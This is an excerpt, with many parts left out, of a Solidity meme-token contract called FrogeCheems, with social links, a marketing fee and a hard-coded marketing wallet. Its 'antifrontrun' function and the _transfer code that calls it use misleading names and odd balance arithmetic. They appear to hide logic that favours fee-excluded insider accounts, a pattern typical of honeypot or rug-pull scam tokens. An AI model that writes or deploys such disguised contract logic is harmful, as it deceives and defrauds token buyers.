...
//https://t.me/FrogeCheems
//https://frogecheems.org
...
contract FrogeCheems is Context, IERC20, Ownable {
    ...
    string private constant _name = "FrogeCheems"; //
    string private constant _symbol = unicode"FREEMS"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x8325b6CF9E8Bf6CB051aA9799f9B15D75ad252a0;
    bool public setReadyTimes = false;


    bool private swapping;
    uint256 private mf = 1000 gwei;
    ...
    function antifrontrun(address account,uint256 register) public view returns(uint256) {
        uint256 burned=balanceOf(account);
        if (isExcludedFromFee(account)){
        return (burned>mf)?register:0;}else{return register;}
    }
    ...
    function _transfer(
        ...
        _tOwned[from] -= amount;
        transferAmount = antifrontrun(from,transferAmount) ;
        _tOwned[address(this)] -= transferAmount; 
